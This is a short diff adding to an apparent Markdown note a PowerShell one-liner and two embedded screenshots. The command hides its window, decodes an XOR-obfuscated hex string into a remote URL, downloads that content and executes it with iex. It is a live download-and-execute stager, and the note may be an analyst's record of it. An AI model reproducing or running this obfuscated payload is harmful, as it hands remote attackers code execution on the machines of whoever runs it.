@@ -1,0 +1,4 @@
+```
+powershell -w h -c $k=15;$h='677b7b7f7c352020686e7b6a7f6e7c7c226c607d7f216c6062207a6a796066786362796563676c7e696e7f78';$u='';for($i=0;$i -lt $h.Length;$i+=2){$u+=[char]([Convert]::ToByte($h.Substring($i,2),16)-bxor$k)};iex(irm $u)
+```
+![[Pasted image 20260210140208.png]]![[Pasted image 20260210140219.png]]
